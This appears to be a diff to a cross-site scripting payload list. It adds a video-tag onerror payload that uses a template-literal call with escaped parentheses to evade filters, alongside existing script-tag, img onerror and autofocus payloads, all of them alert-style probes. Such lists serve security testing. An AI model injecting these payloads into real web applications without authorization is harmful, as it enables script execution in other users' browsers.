@@ -1,6 +1,7 @@
 <script>alert(0)</script>
 "><script>alert(0)</script>
 "><img src onerror=alert(1)> 
+<video src=">" onerror=setTimeout`confirm\x281\x29`>
 "autofocus onfocus=alert(1)//
 <script>alert(String.fromCharCode(116, 101, 115, 116))</script>
 </script><script>alert(1)</script> 
